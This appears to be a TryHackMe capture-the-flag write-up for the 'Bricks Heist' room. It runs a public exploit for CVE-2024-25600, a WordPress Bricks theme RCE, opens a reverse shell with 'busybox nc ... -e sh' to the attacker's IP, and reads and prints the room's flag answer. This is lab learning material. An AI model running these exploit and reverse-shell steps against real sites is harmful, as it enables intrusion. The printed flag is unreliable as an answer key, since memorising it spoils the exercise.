# TryHack3M: Bricks Heist

<div style="display: flex; justify-content: center;">
  <img src="/posts/thm/tryhack3mbricksheist_logo.png" alt="HTB" style="width: 30%;">
</div>

# Room description

Room: https://tryhackme.com/r/room/tryhack3mbricksheist

Crack the code, command the exploit! Dive into the heart of the system with just an RCE CVE as your key.

Difficulty: **Easy**

# Write-up
```shell
$ nuclei -target bricks.thm
......
[CVE-2024-25600] [http] [critical] https://bricks.thm/wp-json/bricks/v1/render_element
......
```

search CVE-2024-25600 exploit
https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT

```shell
$ python3 CVE-2024-25600.py            
Traceback (most recent call last):
  File "/home/kali/Desktop/exp.py", line 13, in <module>
    from alive_progress import alive_bar
ModuleNotFoundError: No module named 'alive_progress'

$ pip3 install alive_progress
```
Exploit
```shell
python3 CVE-2024-25600.py -u https://bricks.thm/
...
[*] Checking if the target is vulnerable
[+] The target is vulnerable
[*] Initiating exploit against: https://bricks.thm/
[*] Initiating interactive shell
[+] Interactive shell opened successfully
Shell> id
uid=1001(apache) gid=1001(apache) groups=1001(apache)

Shell> busybox nc 10.11.74.102 9001 -e sh
```
use "BusyBox nc -e" method upgrage to new shell

Listener: use pwncat to catching a victim reverse shell
```shell
$ pip install pwncat-cs
$ pwncat-cs -lp 9001
(local) pwncat$ back
(remote) apache@tryhackme:/data/www/default$ ls
6xxxxa.txt  wp-activate.php       wp-content         wp-mail.php
index.php                             wp-admin              wp-cron.php        wp-settings.php
kod                                   wp-blog-header.php    wp-includes        wp-signup.php
license.txt                           wp-comments-post.php  wp-links-opml.php  wp-trackback.php
phpmyadmin                            wp-config-sample.php  wp-load.php        xmlrpc.php
readme.html                           wp-config.php         wp-login.php
(remote) apache@tryhackme:/data/www/default$ cat 6xxxxa.txt 
THM{fl46_6xxxxa}
```


## Answer the questions below

What is the content of the hidden .txt file in the web folder?\

`THM{fl46_6xxxxa}`
